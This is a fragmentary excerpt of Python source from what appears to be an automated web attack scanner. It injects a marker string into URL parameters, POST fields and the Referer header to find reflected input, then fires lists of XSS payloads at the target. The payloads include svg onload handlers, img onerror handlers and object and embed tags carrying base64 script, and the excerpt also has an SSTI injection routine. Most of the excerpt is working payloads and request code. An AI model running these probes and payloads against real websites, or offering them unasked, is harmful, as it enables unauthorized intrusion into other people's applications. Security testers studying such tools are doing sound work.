...
class paramscanner: # Scanner Module
	...
	def xss(slef,url,co,tim,deco,redir,cagent=None,proxy=None,slp=0):
		...
		if '*' in url:
			...
			sleep(slp)
			ch = re.findall('DesTroTN'.encode('utf-8'),c.content)
			sleep(slp)
			check = requests.get(url.replace('*','DesTroTN'),headers={'User-agent':uagent(cagent=cagent)},cookies=co,verify=False,allow_redirects=redir,timeout=tim,proxies=proxy)
			che = re.findall('DesTroTN'.encode('utf-8'),check.content)
			if len(ch) < len(che):
				logger.info('reflect is found')
				payloads=['">DesTroTN<svg/onload=confirm(/DesTroTN/)>web"','"><img src="x" OnMouseEnter=(confirm)(1)>DesTroTN','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','<img src=x onerror=alert(1)>',"'><img src=x onerror=alert(1)>"]
...
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
			...
			payloads=['">DesTroTN<svg/onload=confirm(/DesTroTN/)>web"','"><img src="x" OnMouseEnter=(confirm)(1)>DesTroTN','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">']
			x = 0
			for params in url.split("?")[1].split("&"):
				sleep(slp)
				r2 = requests.get(url.replace(params, params + str('DesTroTN')),headers={'User-agent':uagent(cagent=cagent)},cookies=co,verify=False,allow_redirects=redir,timeout=tim,proxies=proxy)
				sleep(slp)
				...
				r2 = re.findall('DesTroTN'.encode('utf-8'),r2.content)
				r1 = re.findall('DesTroTN'.encode('utf-8'),r1.content)
				if len(r2) > len(r1):
					for payload in payloads:
						payload2=urlencoder(payload)
						for i in range(deco):
...
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
			...
			payloads=["'><img src=x onerror=alert(1)>",'">DesTroTN<svg/onload=confirm(/DesTroTN/)>web"','"><img src="x" OnMouseEnter=(confirm)(1)>DesTroTN','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">']
			x = 0
			sleep(slp)
			r1 = requests.post(url,data=dat,cookies=co,verify=False,allow_redirects=redir,timeout=tim,headers={'User-agent':uagent(cagent=cagent)},proxies=proxy)
			sleep(slp)
	...
	def ssti_post(self,url,co,tim,dat,redir,cagent=None,proxy=None,slp=0,batch=None):
		...
		if ok:
			...
			for payload in payloads:
				...
				for i,c in dat.items():
					dat[i] = c.replace('DesTroTNSSTI',payload)
				sleep(slp)
...
class headers_scanner: # Header Scanner Module ;-;
	...
	def referrer_xss(url,timeo=None,cookie=None,redir=None,deco=None,method=None,date=None,cagent=None,proxy=None,slp=0,batch=None):
		deco = deco - 1
		payloads=["<img src=x onerror=alert(1)>",'">DesTroTN<svg/onload=confirm(/DesTroTN/)>web',"'><img src=x onerror=alert(1)>"]
		for payload in payloads:
			if method == 'get':
				sleep(slp)
